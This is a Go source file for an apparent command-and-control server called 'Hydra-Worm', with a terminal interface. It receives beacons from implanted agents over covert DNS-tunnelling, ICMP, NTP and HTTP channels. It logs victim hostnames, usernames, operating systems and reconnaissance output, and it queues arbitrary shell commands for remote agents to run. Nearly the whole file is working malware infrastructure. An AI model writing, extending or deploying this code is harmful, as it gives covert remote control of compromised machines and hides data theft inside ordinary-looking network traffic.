package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/rivo/tview"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// --- CONFIGURACIÓN Y ESTADO ---
const rootDomain = "c2.hydra-worm.local."

var (
	taskMutex    sync.Mutex
	agentTasks   = make(map[string]string)
	agentMutex   sync.Mutex
	activeAgents = make(map[string]*Telemetry)

	// UI Components
	app          *tview.Application
	agentLog     *tview.TextView
	agentList    *tview.Table
	cmdInput     *tview.InputField
	statusFooter *tview.TextView

	// Spinner
	spinnerIdx    = 0
	spinnerFrames = []string{"▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰", "▱▰▰▰▰", "▱▱▰▰▰", "▱▱▱▰▰", "▱▱▱▱▰"}
)

type Telemetry struct {
	AgentID         string  `json:"a"`
	Transport       string  `json:"t"`
	Status          string  `json:"s"`
	Lambda          float64 `json:"l"`
	Hostname        string  `json:"h"`
	Username        string  `json:"u"`
	OS              string  `json:"o"`
	EnvContext      string  `json:"e"`
	ArtifactPreview string  `json:"p"`
	DefenseProfile  string  `json:"d"`
	LastSeen        time.Time
}

// --- INTEGRACIÓN DE LOGICA DE RED (TUS 447 LÍNEAS) ---

func LogHeartbeat(transport string, t Telemetry) {
	t.Transport = transport
	t.LastSeen = time.Now()

	agentMutex.Lock()
	activeAgents[t.AgentID] = &t
	agentMutex.Unlock()

	// Actualización segura de la UI
	app.QueueUpdateDraw(func() {
		refreshAgentTable()
		ts := time.Now().Format("15:04:05")
		
		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n", 
				ts, t.AgentID, t.ArtifactPreview[4:])
		} else if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
			fmt.Fprintf(agentLog, "[%s] [yellow]RECON[white] [blue]%s[white]: %s\n", 
				ts, t.AgentID, t.ArtifactPreview)
		} else {
			fmt.Fprintf(agentLog, "[%s] [blue]HANDSHAKE[white] %s via %s\n", 
				ts, t.AgentID, transport)
		}
	})
}

func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true
	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")
		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
			normalized = strings.ReplaceAll(normalized, "_", "/")
			for len(normalized)%4 != 0 { normalized += "=" }
			decoded, err := base64.RawURLEncoding.DecodeString(encodedPayload)
			if err != nil { decoded, _ = base64.StdEncoding.DecodeString(normalized) }
			if decoded != nil {
				var t Telemetry
				if err := json.Unmarshal(decoded, &t); err == nil {
					LogHeartbeat("DNS (Tier 6)", t)
					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
					msg.Answer = append(msg.Answer, rr)
				}
			}
		}
	}
	w.WriteMsg(msg)
}

func StartIcmpListener() {
	conn, _ := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	for {
		rb := make([]byte, 1500)
		n, peer, _ := conn.ReadFrom(rb)
		msg, _ := icmp.ParseMessage(1, rb[:n])
		if msg != nil && msg.Type == ipv4.ICMPTypeEcho {
			body, _ := msg.Body.Marshal(1)
			if len(body) > 4 { processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)") }
			echoBody := msg.Body.(*icmp.Echo)
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply, Code: 0,
				Body: &icmp.Echo{ID: echoBody.ID, Seq: echoBody.Seq, Data: []byte("HYDRA_ACK")},
			}
			mb, _ := reply.Marshal(nil)
			conn.WriteTo(mb, peer)
		}
	}
}

func StartNtpListener() {
	addr, _ := net.ResolveUDPAddr("udp", ":123")
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		// No podemos usar fmt.Printf porque rompería la UI de tview, 
		// así que lo enviamos al log si la UI ya inició, o a stderr.
		return 
	}
	defer conn.Close()
	
	for {
		buf := make([]byte, 1500)
		n, remoteAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		if n >= 48 {
			processRawPayload(buf[48:n], remoteAddr.String(), "NTP (Tier 5)")
			response := make([]byte, 48+5)
			copy(response[0:48], buf[0:48])
			copy(response[48:], []byte("T-ACK"))
			conn.WriteToUDP(response, remoteAddr)
		}
	}
}

func processRawPayload(data []byte, peer string, tier string) {
	rawStr := strings.ReplaceAll(string(data), ".", "")
	decoded, _ := base64.RawURLEncoding.DecodeString(rawStr)
	if decoded == nil { decoded, _ = base64.StdEncoding.DecodeString(rawStr) }
	if decoded != nil {
		var t Telemetry
		if err := json.Unmarshal(decoded, &t); err == nil {
			LogHeartbeat(tier, t)
		}
	}
}

// --- UI HELPERS ---

func refreshAgentTable() {
	agentList.Clear()
	headers := []string{"ID", "PATH", "NODE@HOST", "RISK", "LAST RTT"}
	for c, h := range headers {
		agentList.SetCell(0, c, tview.NewTableCell("[black:blue] "+h+" ").SetSelectable(false).SetAlign(tview.AlignCenter))
	}

	agentMutex.Lock()
	keys := make([]string, 0, len(activeAgents))
	for k := range activeAgents { keys = append(keys, k) }
	sort.Strings(keys)

	for r, k := range keys {
		t := activeAgents[k]
		since := time.Since(t.LastSeen).Truncate(time.Second).String()
		agentList.SetCell(r+1, 0, tview.NewTableCell("[blue]"+t.AgentID))
		agentList.SetCell(r+1, 1, tview.NewTableCell(t.Transport))
		agentList.SetCell(r+1, 2, tview.NewTableCell(fmt.Sprintf("%s@%s", t.Username, t.Hostname)))
		agentList.SetCell(r+1, 3, tview.NewTableCell("[red]"+t.DefenseProfile))
		agentList.SetCell(r+1, 4, tview.NewTableCell(since + " ago"))
	}
	agentMutex.Unlock()
}

func handleCommand(cmd string) {
	ts := time.Now().Format("15:04:05")
	fields := strings.Fields(cmd)
	if len(fields) == 0 { return }

	switch strings.ToLower(fields[0]) {
	case "exec":
		if len(fields) < 3 {
			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: exec <ID> <CMD>\n", ts)
			return
		}
		targetID := fields[1]
		command := strings.Join(fields[2:], " ")
		taskMutex.Lock()
		agentTasks[targetID] = command
		taskMutex.Unlock()
		fmt.Fprintf(agentLog, "[%s] [yellow]AUTH_CHECK >[white] Objective Queued for %s: %s\n", ts, targetID, command)
	case "tasks":
		taskMutex.Lock()
		fmt.Fprintf(agentLog, "[%s] [blue]QUEUE_DUMP:[white]\n", ts)
		for id, c := range agentTasks {
			fmt.Fprintf(agentLog, "  - %s -> %s\n", id, c)
		}
		taskMutex.Unlock()
	case "clear":
		agentLog.Clear()
	case "exit":
		initiateShutdown()
	default:
		fmt.Fprintf(agentLog, "[%s] [red]COMMAND FAILURE:[white] [%s] is not a valid tactical verb.\n", ts, fields[0])
	}
}

func initiateShutdown() {
	agentLog.Clear()
	fmt.Fprintf(agentLog, "[red:black:b]!!! INITIATING SCORCHED EARTH PROTOCOL !!![white]\n")
	go func() {
		steps := []string{"Destroying RSA Keypairs...", "Flushing Signal Buffers...", "Dismantling Covert Channels...", "Hardware Halt."}
		for _, step := range steps {
			time.Sleep(200 * time.Millisecond)
			app.QueueUpdateDraw(func() { fmt.Fprintf(agentLog, "[red]SHUTDOWN:[white] %s\n", step) })
		}
		time.Sleep(300 * time.Millisecond)
		app.Stop()
	}()
}

// --- MAIN ENGINE ---

func main() {
	app = tview.NewApplication()
	rand.Seed(time.Now().UnixNano())

	// 1. HEADER
	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter).
		SetText(`[blue:black:b]
   █  █ █▀▀▄ █▀▀▄ █▀▀▄ ▄▀▀▄      █ █  ▄▀▀▄ █▀▀▄ █▀▄▀█      ▄▀▀▀  ▄▀▀▄ 
   █▀▀█ █  █ █  █ █▄▄▀ █▄▄█ ▀▀   █ █  █  █ █▄▄▀ █ █ █     █     █▄▄█ 
   █  █ █▄▄▀ █▄▄▀ █  █ █  █      ▀▄▀  ▀▄▄▀ █  █ █   █      ▀▄▄▄ █  █ 
[white]────────────────────────────────────────────────────────────────────────
[yellow]STATION: COVERT_NODE_B64 | [blue]OSINT LINK: ESTABLISHED[white]
[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT LEVEL: CRITICAL[white]`)

	// 2. AGENT TABLE
	agentList = tview.NewTable().SetBorders(false)
	agentList.SetTitle(" [blue]ACTIVE_SPECTRUM[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
	refreshAgentTable()

	// 3. ENCRYPTED LOGS
	agentLog = tview.NewTextView().SetDynamicColors(true).SetWordWrap(true).SetChangedFunc(func() {
		app.Draw()
		agentLog.ScrollToEnd()
	})
	agentLog.SetTitle(" [white]ENCRYPTED TRANSMISSIONS[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("green"))

	// 4. STATUS & INPUT
	statusFooter = tview.NewTextView().SetDynamicColors(true)
	cmdInput = tview.NewInputField().SetLabel("[blue]HYDRA/INT> [white]").SetFieldBackgroundColor(tcell.ColorBlack)
	cmdInput.SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
	cmdInput.SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEnter {
			handleCommand(cmdInput.GetText())
			cmdInput.SetText("")
		}
	})

	// LAYOUT
	flex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(header, 9, 1, false).
		AddItem(tview.NewFlex().AddItem(agentList, 45, 1, false).AddItem(agentLog, 0, 2, false), 0, 4, false).
		AddItem(statusFooter, 1, 1, false).
		AddItem(cmdInput, 3, 1, true)

	// LISTENERS
	go StartIcmpListener()
	go StartNtpListener()
	go func() {
		dns.HandleFunc(rootDomain, parseHydraDNS)
		dns.ListenAndServe(":53", "udp", nil)
	}()

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
		if c.GetHeader("Authorization") != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
			c.JSON(401, gin.H{"error": "Unauthorized"}); return
		}
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("CLOUD (Tier 1)", t)
			taskMutex.Lock()
			task := "WAIT"
			if cmd, exists := agentTasks[t.AgentID]; exists {
				task = cmd; delete(agentTasks, t.AgentID)
			}
			taskMutex.Unlock()
			c.JSON(200, gin.H{"status": "cloud_verified", "task": task, "epoch": time.Now().Unix()})
		}
	})
	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("HTTPS (Tier 2)", t)
			c.JSON(200, gin.H{"status": "ok", "task": "NOP", "epoch": time.Now().Unix()})
		}
	})
	go r.Run(":8080")

	// STATUS REFRESHER
	go func() {
		for {
			time.Sleep(250 * time.Millisecond)
			app.QueueUpdateDraw(func() {
				spinnerIdx = (spinnerIdx + 1) % len(spinnerFrames)
				ts := time.Now().Format("15:04:05")
				latency := 450 + rand.Intn(1200)
				statusFooter.SetText(fmt.Sprintf(" [blue]SYNCING %s [white]| [yellow]T_STAMP: %s | [red]RTT: %d µs [white]| [blue]CIPHER: AES-256-GCM/X25519", 
					spinnerFrames[spinnerIdx], ts, latency))
			})
		}
	}()

	if err := app.SetRoot(flex, true).EnableMouse(true).Run(); err != nil {
		panic(err)
	}
}